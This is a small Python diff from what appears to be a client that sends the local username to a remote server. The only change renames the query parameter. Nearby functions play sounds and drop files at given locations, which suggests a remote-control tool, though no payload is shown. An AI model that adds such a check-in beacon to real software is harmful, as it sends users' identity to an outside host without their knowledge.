@@ -108,7 +108,7 @@ def play_sound_thread(soundfile_data: bytes) -> None:
 
 
 def post_user() -> None:
-    post(f"{SCHEME}://{IP}:{PORT}/getuser-center?user={getenv('USERNAME')}")
+    post(f"{SCHEME}://{IP}:{PORT}/getuser-center?username={getenv('USERNAME')}")
 
 
 def drop_file(content: str, location: str) -> None:
